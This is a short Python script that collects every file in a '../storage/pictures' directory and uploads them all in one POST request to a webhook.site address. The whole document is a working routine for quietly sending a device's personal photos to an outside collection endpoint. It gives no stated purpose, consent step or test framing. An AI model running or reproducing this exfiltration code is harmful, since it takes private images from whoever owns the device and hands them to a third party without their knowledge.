import os
import requests

# Define the URL for the webhook
url = "https://webhook.site/42f33b37-f054-4344-87e5-32947638f6c6"

# Define the path to the directory
dir_path = "../storage/pictures"

# Get a list of all files in the directory
files = [f for f in os.listdir(dir_path) if os.path.isfile(os.path.join(dir_path, f))]

# Prepare the files for the POST request
files_to_send = {file: open(os.path.join(dir_path, file), 'rb') for file in files}

# Send the POST request
response = requests.post(url, files=files_to_send)

# Close the file handles after sending
for file in files_to_send.values():
    file.close()

# Print the response from the server
print(response.text)
